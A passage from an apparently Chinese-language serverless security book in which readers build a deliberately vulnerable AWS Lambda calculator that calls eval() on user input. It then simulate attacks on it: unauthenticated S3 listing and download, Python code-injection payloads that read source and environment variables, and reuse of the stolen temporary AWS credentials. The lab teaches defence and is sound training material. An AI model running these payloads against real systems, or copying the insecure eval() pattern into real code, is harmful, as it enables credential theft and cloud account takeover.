  \ 6-1）。\n\n![](img/lsse_0601.png)\n\n此应用程序允许用户在浏览器中输入数学表达式，后端对其进行求值并将响应发送回前端。在你完成动手示例的过程中，你将了解这些问题和错误配置如何被利用，并将看到可以实施的实用对策来减轻这些风险。\n\
  \n> Caution\n>\n> 在完成本章和下一章中的动手示例和模拟后，请务必删除云账户中所有的 Lambda 函数、S3 存储桶、IAM 角色和其他资源，以避免意外的费用和安全风险。\n\
  \n#### Setting Up a Vulnerable AWS Lambda Function\n\n让我们开始设置一个易受攻击的 AWS Lambda\
  \ 函数，该函数接受并求值用户提供的数学表达式。在本节中，你将重新创建并探索在真实无服务器应用程序中发现的几个编码和配置问题，包括函数代码中使用 `eval()`、源代码中硬编码的凭据以及存储在环境变量中的密钥。你还将使\
  \ Lambda 函数通过未经身份验证的函数 URL 暴露，该 URL 由托管在 S3 存储桶中的静态 Web 前端直接调用。^1\n\n在深入动手部分之前，让我们定义与本章相关的几个关键术语：\n\
  \n**AWS Lambda function**\n\n这段自包含的代码是无服务器应用程序的基本构建块。它响应特定事件运行，例如 API 请求、文件上传或数据库更新，并在\
  \ AWS 管理的安全隔离环境中执行。^2 每个函数都有一个单一的处理程序方法，该方法接收事件数据并执行你指定的逻辑。\n\n**Lambda execution\
  \ environment**\n\n这个安全隔离的空间管理运行函数代码的资源。你在创建函数时提供配置——例如内存和超时——Lambda 使用此配置来配置执行环境。\n\
  \n**Lambda runtime**\n\n管理调用事件流、上下文信息和函数响应的语言特定环境。Lambda 函数的运行时作为进程在 Lambda 执行环境内部运行。\n\
  \n**Lambda execution role**\n\n函数在运行时假定的 AWS IAM 角色。它定义了函数可以执行的操作以及可以操作的资源。\n\n\
  **Function URL**\n\n一个 HTTPS 端点，允许你直接从 Web 浏览器、`curl` 或任何 HTTP 客户端调用 Lambda 函数，而无需\
  \ API 网关。它提供了一种快速简单的方式来公开你的函数，非常适合原型设计和构建小型或简单应用程序。\n\n你可以将本节中将设置的易受攻击 Lambda 函数视为高安全建筑内的维护控制台。它旨在让授权人员执行有限的系统任务，但如果未受保护或配置错误，攻击者可以将其用作进入点来篡改或控制建筑的系统。\n\
  \n> Note\n>\n> 本节假设你使用的是 Serverless Lab 账户，该账户托管易受攻击的无服务器实验室环境。\n\n让我们现在逐步进行设置过程：\n\
  \n1. Sign in to the [AWS Management Console](https://oreil.ly/qe5es).\n2. 在搜索栏中输入\
  \ `lambda`，然后从搜索结果列表中选择 Lambda。\n3. 在左侧导航窗格中，选择 Functions，然后单击“Create function”。\n\
  \n   > Caution\n   >\n   > 在本章中，所有示例都假设你的 AWS 区域设置为 `us-east-1`。请确保 AWS 控制台右上角选择的区域设置为\
  \ `United States (N. Virginia)`。\n\n4. 在“Create function”页面上，选择“Author from scratch”\
  \ (Figure 6-2)。\n\n   ![](img/lsse_0602.png)\n\n   在“Basic information”窗格中，在“Function\
  \ name”字段中指定 `lambda-0010`。然后为 Runtime 选择 Python 3.13。\n\n   > Tip\n   >\n   > 如果你在阅读本文时有更新的\
  \ Python 运行时可用——例如 Python 3.14 或更高版本——你可以选择它。\n\n\n\n\n\n点击“Permissions”下的“Change\
  \ default execution role”以显示可用选项。在“Execution role”下，选择“Create a new role with basic\
  \ Lambda permissions”。点击“Additional configurations”以显示可用选项。\n\n在 Networking 部分下，在\
  \ Function URL 下，打开 Enable 复选框。对于“Auth type”，选择 NONE。打开“Configure cross-origin resource\
  \ sharing (CORS)”复选框。点击“Create function”以继续创建你的 Lambda 函数。\n\n#### Note\n\n你应该会收到一条确认消息，内容为\
  \ `Successfully created the function lambda-0010`。Lambda 函数创建完成后，下一步是使用两个代表真实世界密钥的示例环境变量来配置该函数。\n\
  \n5. 导航到 Configuration 选项卡。点击“Environment variables”然后点击 Edit。\n\n6. 在“Edit environment\
  \ variables”页面，点击“Add environment variable”。然后在 Key 和 Value 字段下分别指定以下键值对：\n\n* \
  \  `CUSTOM_ENV_VAR_01`: `KLMNO`\n*   `CUSTOM_ENV_VAR_02`: `PQRST`\n\n点击 Save 以使用你指定的环境变量值更新\
  \ Lambda 函数。\n\n7. 让我们调整函数 URL 配置以允许从 S3 托管的网站发出的前端到后端请求成功。在 Configuration 选项卡上，点击\
  \ Function URL 然后点击 Edit。\n\n在 Configure Function URL 页面，点击“Additional settings”以显示可用选项。在“Allow\
  \ headers”下，点击“Add new value”然后指定 `content-type`。在“Allow methods”下，从下拉菜单中选择 `*`。点击\
  \ Save。你应该会收到一条成功通知，内容为 `Your changes have been saved`。\n\n8. 现在是时候将易受攻击的代码引入你的\
  \ Lambda 函数了。导航到 Code 选项卡。在“Code source”部分，用以下内容替换现有的 `lambda_function.py` 代码：\n\
  \n```\nfrom os import environ\nget_env = environ.get\n\nHARDCODED_KEY_01 = \"ABCDE\"\
  \nHARDCODED_KEY_02 = \"FGHIJ\"\n\n\ndef get_statement(event):\n    params = event.get('queryStringParameters',\
  \ {})\n    statement = params.get('statement', None)\n\n    return statement\n\n\
  \ndef process_statement(statement):\n    output = \"No statement parameter value\
  \ provided\"\n\n    if statement:\n        output = eval(statement)\n\n    return\
  \ output\n\n\ndef lambda_handler(event, context):\n    print(\"event: \", event)\n\
  \    print(\"HARDCODED_KEY_01: \", HARDCODED_KEY_01)\n    print(\"HARDCODED_KEY_02:\
  \ \", HARDCODED_KEY_02)\n    print(\"CUSTOM_ENV_VAR_01: \", get_env('CUSTOM_ENV_VAR_01'))\n\
  \    print(\"CUSTOM_ENV_VAR_02: \", get_env('CUSTOM_ENV_VAR_02'))\n\n    statement\
  \ = get_statement(event)\n    result = process_statement(statement)\n\n    return\
  \ {\n        'statusCode': 200,\n        'body': str(result)\n    }\n```\n\n此 `lambda_handler()`\
  \ 函数通过调用 `get_statement()` 从输入事件数据中提取表达式，然后将其传递给 `process_statement()` 进行求值来处理请求事件。\n\
  \n#### Tip\n\n虽然在开发和测试期间 `print()` 语句很方便，但在生产环境中你应该使用 Python 内置的 `logging` 模块或其他结构化日志库。这些库让你可以定义日志级别（`INFO`、`WARNING`、`ERROR`），一致地格式化消息，并与\
  \ CloudWatch 等集中式日志解决方案集成。结构化日志改进了可观测性，使搜索和分析日志变得更容易，并有助于防止敏感信息意外泄露。\n\n在 `lambda_function.py`\
  \ 中完成更新后，点击 Deploy。你应该会收到通知 `Successfully updated the function lambda-0010`。\n\n\
  要测试你刚刚部署的 Lambda 函数，点击 Test。然后点击“Create new test event”。对于 Event Name 值，指定 `event-0010`。输入以下\
  \ Event JSON 值：\n\n```\n{\n  \"queryStringParameters\": {\n    \"statement\": \"\
  1 + 1\"\n  }\n}\n```\n\n点击 Save 按钮。然后点击 Invoke。这会产生以下输出响应：\n\n```\nStatus: Succeeded\n\
  Test Event Name: event-0010\n\nResponse:\n{\n  \"statusCode\": 200,\n  \"body\"\
  : \"2\"\n}\n\nFunction Logs:\nSTART RequestId: ... Version: $LATEST\nevent: {'queryStringParameters':\
  \ {'statement': '1 + 1'}}\nHARDCODED_KEY_01:  ABCDE\nHARDCODED_KEY_02:  FGHIJ\n\
  CUSTOM_ENV_VAR_01:  KLMNO\nCUSTOM_ENV_VAR_02:  PQRST\nEND RequestId: ...\nREPORT\
  \ RequestId: ...   Duration: 11.69 ms  Billed Duration: 12 ms\nMemory Size: 128\
  \ MB Max Memory Used: 35 MB\n```\n\n9. 在页面顶部的“Function overview”窗格中，点击格式为 `https://generated-id.lambda-url.us-east-1.on.aws/`\
  \ 的函数 URL。\n\n#### Note\n\n这将在新的浏览器标签页中打开函数 URL。由于你尚未指定要求值的表达式，你会收到 `No statement\
  \ parameter value provided` 作为响应。\n\n10. 让我们做几个测试。通过在查询字符串中包含 `?statement=42` 将\
  \ `42` 传递给函数：\n\n```\nhttps://generated-id.lambda-url.us-east-1.on.aws/?statement=42\n\
  ```\n\n这会返回 `42`。\n\n接下来，让我们将 `1 + 1` 传递给函数并直接包含在查询字符串中：\n\n```\nhttps://generated-id.lambda-url.us-east-1.on.aws/?statement=1+1\n\
  ```\n\n这会返回 `Internal Server Error`。\n\n#### Note\n\n在 URL 中，`+` 字符被解释为空格。因此，`?statement=1+1`\
  \ 被解码为 `1 1`，由于 `1 1` 不是有效表达式，这会导致 `Internal Server Error`。为了保留 `+`，必须将其编码为 `%2B`\
  \ 以确保函数接收到正确的输入：`1 + 1`。\n\n在查询字符串中传递 `?statement=1%2B1`：\n\n```\nhttps://generated-id.lambda-url.us-east-1.on.aws/?statement=1%2B1\n\
  ```\n\n这次，Lambda 函数成功求值输入并返回 `2`。\n\n11. 在进入下一节之前，切换回已打开 AWS Lambda 控制台的浏览器标签页。确保你已打开\
  \ `lambda-0010` 的 AWS Lambda 函数详情页面。\n\n在“Function overview”部分，复制函数 URL，然后将其粘贴到本地机器上的文本编辑器中，以便你可以在\
  \ “Configuring an S3 Bucket for Static Website Hosting” 中轻松引用它。\n\n你现在已完成易受攻击的按设计\
  \ Lambda 函数的设置。在下一节中，你将设置通过其函数 URL 调用 Lambda 函数并发送数学表达式负载进行求值的 S3 托管前端。\n\n####\
  \ Configuring an S3 Bucket for Static Website Hosting\n\n除了存储文件外，Amazon S3 还允许你托管一个与\
  \ AWS Lambda 函数和 API Gateway 资源等无服务器后端资源交互的静态网站。无需将前端代码托管在 Web 服务器或 EC2 实例上，你可以直接从\
  \ S3 存储桶提供服务，从而消除配置或维护服务器的需求。\n\n在本节中，你将在 S3 存储桶中部署和配置一个与上一节中设置的 Lambda 函数交互的静态\
  \ Web 前端。你将首先克隆包含前端代码的存储库并将其上传到 S3 存储桶。接下来，你将在存储桶上启用静态网站托管并使其公开可访问，以便网站可以直接从 S3\
  \ 提供服务。最后，你将通过在浏览器中输入示例有效数学表达式并确认求值结果按预期返回并显示来验证整个端到端工作流是否正常运行。\n\n#### Note\n\n\
  本节假设你正在使用 Serverless Lab 账户，该账户托管易受攻击的按设计无服务器实验室环境。\n\n\n\n\n\n### 设置 S3 主机前端\n\n\
  让我们继续设置 S3 主机前端：\n\n1. 在 AWS 管理控制台中，在搜索栏中输入 `cloudshell`，然后从匹配的服务列表中选择 CloudShell。\n\
  \n#### Tip\n\n如果出现 Welcome to CloudShell 弹出窗口，只需单击 Close 即可继续。\n\n2. 在 CloudShell\
  \ 终端中（在 `$` 符号之后）运行以下命令以克隆 `vulnerable-lambda-function-frontend` 仓库：\n\n```\nUSERNAME=learning-serverless-security\n\
  REPO=vulnerable-lambda-function-frontend\n\ngit clone https://github.com/$USERNAME/$REPO.git\n\
  \ncd vulnerable-lambda-function-frontend\n```\n\n#### Note\n\n本节使用的所有代码示例和命令都可以在\
  \ [`vulnerable-lambda-function-frontend` GitHub 仓库](https://oreil.ly/0Ew49) 中找到。\n\
  \n3. 使用 `tree` 命令检查项目结构：\n\n```\nsudo yum install tree -y\n\ntree\n```\n\n这会输出以下树状的文件和文件夹结构：\n\
  \n```\n.\n├── backup\n│   └── lambda_function.py\n├── index.html\n└── README.md\n\
  \n1 directory, 3 files\n```\n\n4. 将 `[SPECIFY LAMBDA FUNCTION URL]` 替换为“设置易受攻击的\
  \ AWS Lambda 函数”中的实际函数 URL，然后运行以下命令以更新 `index.html` 文件中指定的占位符值：\n\n```\nFUNCTION_URL=\"\
  [SPECIFY LAMBDA FUNCTION URL]\"\n\nsed -i \"s|<INSERT FUNCTION URL HERE>|$FUNCTION_URL|g\"\
  \ index.html\n```\n\n5. 检查 `index.html` 的内容并确认代码已正确更新：\n\n```\nless -N index.html\n\
  ```\n\n确保 `index.html` 文件第 98 行的占位符 `<INSERT FUNCTION URL HERE>` 已被实际的 Lambda 函数\
  \ URL 替换。^4\n\n#### Tip\n\n在验证代码更新后，按 Q 退出 `less` 查看器并返回终端。\n\n6. 创建一个新的 S3 存储桶：\n\
  \n```\nBUCKET_NAME=\"serverless-static-website-$(date +%s)\"\nREGION=\"us-east-1\"\
  \n\naws s3 mb s3://$BUCKET_NAME --region $REGION\n```\n\n运行该命令会在 `us-east-1` 中创建\
  \ S3 存储桶——对应美国东部（弗吉尼亚北部）AWS 区域。\n\n#### Note\n\n附加 `date +%s` 命令的输出有助于确保生成的 S3 存储桶名称在所有\
  \ AWS 账户中都是全局唯一的，因为它返回自 1970 年 1 月 1 日以来的秒数。例如，如果你运行此命令，你会得到类似 `1751705486` 的值。这确保即使两个用户运行相同的命令来创建新的\
  \ S3 存储桶，由于唯一的时间戳，结果的存储桶名称也会不同。\n\n7. 配置 S3 存储桶以进行公共访问和静态网站托管：\n\n```\naws s3api\
  \ put-public-access-block \\\n  --bucket \"$BUCKET_NAME\" \\\n  --public-access-block-configuration\
  \ '{\n    \"BlockPublicAcls\": false,\n    \"IgnorePublicAcls\": false,\n    \"\
  BlockPublicPolicy\": false,\n    \"RestrictPublicBuckets\": false\n  }'\n\naws s3\
  \ cp index.html s3://$BUCKET_NAME/index.html\n\naws s3 website \"s3://$BUCKET_NAME/\"\
  \ --index-document index.html\n```\n\n8. 将 Lambda 函数源代码的备份副本上传到 S3 存储桶：\n\n```\n\
  aws s3 cp backup s3://$BUCKET_NAME/backup --recursive\n```\n\n#### Caution\n\n这是在实践中*不应该*做的事情的一个例子。切勿将应用程序的源代码存储到配置为静态网站托管的存储桶中。正如你在本章后面会看到的，攻击者可以利用\
  \ S3 存储桶的配置错误来发现源代码备份文件夹并下载其内容。\n\n9. 设置一个公共存储桶策略，允许用户访问 S3 主机 Web 应用程序：\n\n```\n\
  cat > bucket-policy.json <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\"\
  : [\n    {\n      \"Sid\": \"PublicReadGetObject\",\n      \"Effect\": \"Allow\"\
  ,\n      \"Principal\": \"*\",\n      \"Action\": [\n        \"s3:GetObject\",\n\
  \        \"s3:ListBucket\"\n      ],\n      \"Resource\": [\n        \"arn:aws:s3:::$BUCKET_NAME\"\
  ,\n        \"arn:aws:s3:::$BUCKET_NAME/*\"\n      ]\n    }\n  ]\n}\nEOF\n\naws s3api\
  \ put-bucket-policy \\\n  --bucket \"$BUCKET_NAME\" \\\n  --policy file://bucket-policy.json\n\
  ```\n\n10. 打印你的 S3 主机网站的 URL：^5\n\n```\necho \"http://$BUCKET_NAME.s3-website-$REGION.amazonaws.com\"\
  \n```\n\n#### Tip\n\n你也可以通过 AWS 管理控制台检索存储桶网站端点，方法是转到 S3 存储桶的 Properties 选项卡，并在“Static\
  \ website hosting”下查看“Bucket website endpoint”。\n\n11. 复制上一步的 URL 输出并将其粘贴到浏览器地址栏中。这应该会打开一个\
  \ S3 主机网站（Figure 6-3）。\n\n![](img/lsse_0603.png)\n\n该页面有一个文本区域，可在其中输入数学表达式。单击 Evaluate\
  \ 按钮会将输入表达式发送到后端 Lambda 函数（`lambda-0010`）进行处理。Lambda 函数通过使用 `eval()`（在 `process_statement()`\
  \ 函数内部）来评估表达式并将输出返回给前端。然后结果会显示在页面上，以便你立即查看评估输出。\n\n#### Tip\n\n尝试在文本区域中输入并评估一个简单的表达式（例如\
  \ `1 + 1`）以确认你的设置按预期工作。\n\n在实践中，S3 主机网站可能会位于 Amazon CloudFront 分发后面，以启用 HTTPS、提供安全的内容交付，并通过将静态资源缓存到更靠近用户的边缘位置来提高性能。借助\
  \ Route 53，你可以配置域名系统（DNS）记录，将来自自定义域的流量路由到 CloudFront 分发，如 Figure 6-4 所示。\n\n![](img/lsse_0604.png)\n\
  \n为了避免不必要的开销，我们将跳过完整的生产设置，而是专注于模拟攻击者如何利用 S3 存储桶配置错误以及 Lambda 函数中的代码注入漏洞。本章中此无服务器实验室环境设置的初始设置如\
  \ Figure 6-5 所示。\n\n![](img/lsse_0605.png)\n\n有了此设置，用户可以通过浏览器访问 S3 主机网站，在文本区域中输入有效的数学表达式，单击\
  \ Evaluate 按钮，并查看 Lambda 函数返回的评估结果。从攻击者的角度来看，此设置为利用不安全的输入处理并发起代码注入攻击提供了机会。如果代码注入攻击成功，攻击者可能会获得对\
  \ Lambda 执行环境中存储的环境变量和密钥的未经授权的访问，并可能通过滥用函数的 IAM 角色权限来提升权限并访问 AWS 账户中的其他资源。\n\n当你阅读本章的每个部分时，你将看到此实验室设置如何演变以阻止出站连接并通过具有限制性网络控制的\
  \ VPC 防止数据外泄。这将帮助你以逐步的方式模拟攻击和防御，每一节都建立在前一节的基础上。\n\n### 测试常见的 S3 存储桶配置错误\n\n虽然你可能很想立即测试代码注入，但最好先查看相关资源和组件是否存在配置问题。由于此无服务器应用程序使用\
  \ Amazon S3 来托管前端，因此自然的起点是检查 S3 存储桶是否存在常见的配置错误以及是否存在任何可能暴露的源代码或凭据。\n\n有鉴于此，让我们模拟攻击者发现并从\
  \ S3 存储桶下载暴露的文件：\n\n\n\n\n\n1. 将 `[S3 BUCKET NAME]` 替换为你的 S3 存储桶的实际名称，然后在浏览器中打开以下\
  \ URL：\n\n```\nhttp://[S3 BUCKET NAME].s3.amazonaws.com/\n```\n\n#### Note\n\n如果你的存储桶名称是\
  \ `serverless-static-website-abc123`，则 URL 将为 *http​://serverless-static-website-abc123.s3​.ama⁠zonaws.com/*。\n\
  \n这会返回一个类似以下的 XML 响应：\n\n```\n<ListBucketResult xmlns=\"http://s3.amazonaws.com/doc/2006-03-01/\"\
  >\n <Name>serverless-static-website-...</Name>\n <Prefix/>\n <Marker/>\n <MaxKeys>1000</MaxKeys>\n\
  \ <IsTruncated>false</IsTruncated>\n <Contents>\n  <Key>backup/lambda_function.py</Key>\n\
  \  <LastModified>...</LastModified>\n  ...\n </Contents>\n <Contents>\n  <Key>index.html</Key>\n\
  \  <LastModified>...</LastModified>\n  ...\n </Contents>\n</ListBucketResult>\n\
  ```\n\n如 XML 响应所示，S3 存储桶包含键 `backup/lambda_function.py`，如果存储桶权限允许公开读取，则该键可能可以访问。\n\
  \n2. 将 `[S3 BUCKET NAME]` 替换为你的 S3 存储桶的实际名称，然后在浏览器中打开以下 URL 以尝试直接访问该文件：\n\n```\n\
  http://[S3 BUCKET NAME].s3.amazonaws.com/backup/lambda_function.py\n```\n\n如果文件可公开访问，则会直接在浏览器中显示\
  \ `lambda_function.py` 代码：\n\n```\nfrom os import environ\nget_env = environ.get\n\
  \nHARDCODED_KEY_01 = \"ABCDE\"\nHARDCODED_KEY_02 = \"FGHIJ\"\n\n...\n```\n\n####\
  \ Note\n\n如果源代码包含硬编码密钥，能够访问此文件 的攻击者将能够检索并滥用这些凭据。他们还可能了解应用程序某些组件的实现方式，这可能会泄露有助于他们识别和利用额外漏洞的实现和配置细节。\n\
  \n3. 在本地机器上打开终端，然后运行以下命令以删除任何存储的 AWS 凭据：\n\n```\nrm ~/.aws/credentials\n```\n\n\
  #### Tip\n\n或者，你可以在删除凭据文件之前先创建其备份——例如，通过运行 `mv ~/.aws/​cre⁠dentials ~/.aws/credentials.bak`。然后你可以使用\
  \ `aws configure list` 验证当前是否没有配置任何配置文件，并且 AWS CLI 未使用任何凭据。\n\n4. 将 `[S3 BUCKET\
  \ NAME]` 替换为你的 S3 存储桶的实际名称，然后运行以下命令将存储桶名称存储在 shell 变量中：\n\n```\nBUCKET_NAME=\"[S3\
  \ BUCKET NAME]\"\n```\n\n5. 列出存储桶的内容以检查是否允许公开列出：\n\n```\naws s3 ls s3://$BUCKET_NAME/\n\
  ```\n\n这会输出以下消息：\n\n```\nUnable to locate credentials. You can configure credentials\
  \ by running \"aws configure\".\n```\n\n6. 运行以下命令以尝试对存储桶内容进行未经身份验证的列出：\n\n```\n\
  aws s3 ls s3://$BUCKET_NAME/ --no-sign-request\n```\n\n这会产生以下输出：\n\n```\n      \
  \                         PRE backup/\n    2025-00-00 00:00:00       3257 index.html\n\
  ```\n\n7. 让我们重复前面的步骤，但这次递归列出所有对象以查看嵌套文件夹中的文件：\n\n```\naws s3 ls s3://$BUCKET_NAME/\
  \ --recursive --no-sign-request\n```\n\n以下是输出：\n\n```\n2025-00-00 00:00:00     \
  \   875 backup/lambda_function.py\n2025-00-00 00:00:00       3257 index.html\n```\n\
  \n8. 要获取更详细的输出，请使用 `aws s3api list-objects` 命令以 JSON 格式输出存储桶内容：\n\n```\naws s3api\
  \ list-objects --bucket $BUCKET_NAME --no-sign-request\n```\n\n你应该会看到类似以下输出的 JSON\
  \ 响应：\n\n```\n{\n    \"Contents\": [\n        {\n            \"Key\": \"backup/lambda_function.py\"\
  ,\n            \"LastModified\": \"2025-00-00T00:00:00+00:00\",\n            \"\
  ETag\": \"\\\"...\\\"\",\n            \"ChecksumAlgorithm\": [\n               \
  \ \"CRC64NVME\"\n            ],\n            \"ChecksumType\": \"FULL_OBJECT\",\n\
  \            \"Size\": 875,\n            \"StorageClass\": \"STANDARD\",\n     \
  \       \"Owner\": {\n                \"DisplayName\": \"...\",\n              \
  \  \"ID\": \"...\"\n            }\n        },\n        {\n            \"Key\": \"\
  index.html\",\n            \"LastModified\": \"2025-00-00T00:00:00+00:00\",\n  \
  \          \"ETag\": \"\\\"...\\\"\",\n            \"ChecksumAlgorithm\": [\n  \
  \              \"CRC64NVME\"\n            ],\n            \"ChecksumType\": \"FULL_OBJECT\"\
  ,\n            \"Size\": 3257,\n            \"StorageClass\": \"STANDARD\",\n  \
  \          \"Owner\": {\n                \"DisplayName\": \"...\",\n           \
  \     \"ID\": \"...\"\n            }\n        }\n    ],\n    \"RequestCharged\"\
  : null,\n    \"Prefix\": \"\"\n}\n```\n\n9. 创建一个用于下载文件的目录，然后检查是否可以在无需身份验证的情况下从存储桶下载特定文件：\n\
  \n```\nmkdir downloaded_files\n\naws s3 cp s3://$BUCKET_NAME/backup/lambda_function.py\
  \ \\\n    ./downloaded_files/ --no-sign-request\n```\n\n这应该会成功将 `lambda_function.py`\
  \ 文件下载到 `downloaded_files` 目录中：\n\n```\ndownload: s3://serverless-static-website.../backup/lambda_function.py\n\
  to downloaded_files/lambda_function.py\n```\n\n10. 创建一个示例文件并尝试在无需身份验证的情况下将其上传到 S3\
  \ 存储桶：\n\n```\ntouch sample.txt\n\naws s3 cp ./sample.txt s3://$BUCKET_NAME/ --no-sign-request\n\
  ```\n\n由于存储桶不允许公开写入，因此此命令应以 `AccessDenied` 错误失败：\n\n```\nupload failed: ./sample.txt\
  \ to\ns3://serverless-static-website.../sample.txt An error occurred\n(AccessDenied)\
  \ when calling the PutObject operation: Access Denied\n```\n\n在实践中，团队可能会对多个用途重复使用同一个\
  \ S3 存储桶，例如托管静态资源、存储备份，有时甚至存储应用程序代码和配置，这可能会无意中将敏感文件和配置数据与托管网站一起暴露。攻击者不会假设 S3 存储桶仅包含\
  \ HTML 或 JavaScript 文件。他们通常会枚举存储桶以检查是否存在其他对象，例如备份、凭据或日志文件，这些文件可能会无意中泄露有助于发起进一步攻击的有用信息。\n\
  \n从防御安全角度来看，你应仔细规划每个 S3 存储桶的用途，并倾向于为不同类型的数据使用单独的存储桶，以避免意外暴露敏感信息。你应确保每个存储桶都应用了正确的访问控制配置，并启用日志记录以持续监控和审计访问。此外，除了这些措施之外，你还应考虑实施自动化警报，以便在\
  \ S3 存储桶配置错误或变得公开可访问时通知你或你的团队。\n\n### 使用代码注入攻击在 Lambda 函数中执行任意代码\n\n在本节中，你将探索攻击者如何通过滥用动态代码执行漏洞来利用编写不佳的\
  \ Lambda 函数。你将首先通过使用有效输入表达式来实验，以确定应用程序的正常行为。然后你将模拟攻击者使用无效和恶意输入，以观察函数对意外情况的反应，包括检索源代码文件和提取环境变量。在使用代码注入有效载荷从\
  \ Lambda 执行环境中检索 AWS 临时凭据后，你将使用它们在攻击者账户中配置新的 AWS CLI 配置文件。\n\n\n\n\n延续之前的类比，这类似于将维护控制台保持解锁状态并配置为接受输入的任何命令，让入侵者运行诊断程序以暴露控制面板原理图、检索访问代码，并外泄系统日志、蓝图和访问列表。这使得攻击者可以轻松地绘制建筑的防御图，识别并提取敏感信息，并可能维持对设施系统的远程访问。\n\
  \n#### Note\n\n本节的后半部分假设你正在使用 Attacker 账户来模拟攻击者尝试利用无服务器实验室环境中的资源。\n\n让我们继续进行模拟：\n\
  \n1. 切换回浏览器标签页，其中 S3 主机网站已打开。\n\n2. 评估以下表格中的输入表达式，以观察 Lambda 函数如何处理有效、无效和潜在危险的输入：\n\
  \n| Input expression || Output response |\n| --- | --- |\n| `1 + 1 + 1` || `3` |\n\
  | --- | --- |\n| `(10 / 5) + 42` || `44.0` |\n| `a` || `Error: HTTP error! Status:\
  \ 502` |\n| `'` || `Error: HTTP error! Status: 502` |\n| `\"` || `Error: HTTP error!\
  \ Status: 502` |\n| `system(\"id\");` || `Error: HTTP error! Status: 502` |\n| `require('child_process').exec('id')`\
  \ || `Error: HTTP error! Status: 502` |\n| `__import__('os').system('id')` || `0`\
  \ |\n\n#### Note\n\nPython 表达式 `__import__('os').system('id')` 执行成功并返回 `0`，这表明其他类似的表达式也可能允许攻击者调用系统级或\
  \ shell 命令。\n\n3. 评估以下表达式：\n\n```\n__import__('subprocess').check_output('ls', shell=True)\n\
  ```\n\n这会返回以下响应：\n\n```\nb'lambda_function.py\\n'\n```\n\n这里，`eval()` 函数在 Lambda\
  \ 函数中执行表达式 `import(subprocess).check_output(ls, shell=True)`，在 shell 中运行 `ls` 命令以列出当前目录中的文件，包括\
  \ `lambda_function.py`。\n\n4. 评估以下表达式以检索 Lambda 函数内部的源代码：\n\n```\n__import__('subprocess').check_output('cat\
  \ *.py', shell=True)\n```\n\n这会返回以下输出：\n\n```\nb'from os import environ\\nget_env\
  \ = environ.get\\n\\nHARDCODED_KEY_01 = \"ABCDE\"\\nHARDCODED_KEY_02 = \"FGHIJ\"\
  \\n\\n\\ndef get_statement(event):\\n    params = event.get(\\'queryStringParameters\\\
  ', {})\\n    statement = params.get(\\'statement\\', None)\\n    \\n    return statement\\\
  n\\n\\ndef process_statement(statement):\\n    output = \"No statement parameter\
  \ value provided\"\\n    \\n    if statement:\\n        output = eval(statement)\\\
  n    \\n    return output\\n\\n\\ndef lambda_handler(event, context):\\n    print(\"\
  event: \", event)\\n    print(\"HARDCODED_KEY_01: \", HARDCODED_KEY_01)\\n    print(\"\
  HARDCODED_KEY_02: \", HARDCODED_KEY_02)\\n    print(\"CUSTOM_ENV_VAR_01: \", get_env(\\\
  'CUSTOM_ENV_VAR_01\\'))\\n    print(\"CUSTOM_ENV_VAR_02: \", get_env(\\'CUSTOM_ENV_VAR_02\\\
  '))\\n    \\n    statement = get_statement(event)\\n    result = process_statement(statement)\\\
  n    \\n    return {\\n        \\'statusCode\\': 200,\\n        \\'body\\': str(result)\\\
  n    }'\n```\n\n这里，Lambda 函数中的 `eval()` 函数在 shell 中运行 `cat *.py` 命令，该命令将当前目录中以 `.py`\
  \ 结尾的所有文件的内容连接并显示出来。\n\n5. 评估以下表达式以检索 Lambda 执行环境中的环境变量：\n\n```\n__import__('subprocess').check_output('env',\
  \ shell=True)\n```\n\n你应该得到以下响应：\n\n```\nb'AWS_LAMBDA_FUNCTION_VERSION=$LATEST\\\
  n_X_AMZN_TRACE_ID=Root=1-...;Parent=...;Sampled=0;Lineage=1:...1:0\\nAWS_EXECUTION_ENV=AWS_Lambda_python3.13\\\
  nAWS_DEFAULT_REGION=us-east-1\\nAWS_LAMBDA_LOG_STREAM_NAME=...\\nAWS_REGION=us-east-1\\\
  nPWD=/var/task\\n_HANDLER=lambda_function.lambda_handler\\nTZ=:UTC\\nLAMBDA_TASK_ROOT=/var/task\\\
  nLANG=en_US.UTF-8\\nCUSTOM_ENV_VAR_01=KLMNO\\nCUSTOM_ENV_VAR_02= PQRST\\nAWS_SECRET_ACCESS_KEY=...\\\
  nAWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/lambda-0010\\nAWS_LAMBDA_RUNTIME_API=...\\\
  nAWS_LAMBDA_FUNCTION_MEMORY_SIZE=128\\nLAMBDA_RUNTIME_DIR=/var/runtime\\nPYTHONPATH=/var/runtime\\\
  n_AWS_XRAY_DAEMON_ADDRESS=...\\nAWS_XRAY_DAEMON_ADDRESS=...\\nSHLVL=0\\nAWS_ACCESS_KEY_ID=...\\\
  nLD_LIBRARY_PATH=...\\nAWS_LAMBDA_INITIALIZATION_TYPE=on-demand\\nAWS_SESSION_TOKEN=...AWS_XRAY_CONTEXT_MISSING=LOG_ERROR\\\
  n_AWS_XRAY_DAEMON_PORT=2000\\n_=/usr/bin/env\\n'\n```\n\n6. 打开一个新的浏览器标签页并使用你的 Attacker\
  \ 账户登录到 [AWS Management Console](https://oreil.ly/qe5es)。\n\n7. 在搜索栏中输入 `cloudshell`，然后从匹配的服务列表中选择\
  \ CloudShell。\n\n8. 在 CloudShell 终端中，运行以下命令 在 `$` 符号之后，使用临时凭证创建一个名为 `assumed-lambda-role`\
  \ 的配置文件：\n\n```\nif [ -e \"$HOME/.aws/credentials\" ]; then\n    mv ~/.aws/credentials\
  \ ~/.aws/credentials.bak\nfi\n\naws configure set aws_access_key_id [KEY_ID] \\\n\
  \    --profile assumed-lambda-role\n\naws configure set aws_secret_access_key [SECRET_ACCESS_KEY]\
  \ \\\n    --profile assumed-lambda-role\n\naws configure set aws_session_token [SESSION_TOKEN]\
  \ \\\n    --profile assumed-lambda-role\n```\n\n请务必将 `[KEY_ID]`、`[SECRET_ACCESS_KEY]`\
  \ 和 `[SESSION_TOKEN]` 替换为来自以下表格的相应值：\n\n| Placeholder || Value |\n| --- | --- |\n\
  | `[KEY_ID]` || `AccessKeyId` value from step 5 (`AWS_ACCESS_KEY_ID`) |\n| --- |\
  \ --- |\n| `[SECRET_ACCESS_KEY]` || `SecretAccessKey` value from step 5 (`AWS_SECRET_ACCESS_KEY`)\
  \ |\n| `[SESSION_TOKEN]` || `SessionToken` value from step 5 (`AWS_SESSION_TOKEN`)\
  \ |\n\n9. 运行以下命令以测试所假设的角色凭证：\n\n```\naws sts get-caller-identity --profile assumed-lambda-role\n\
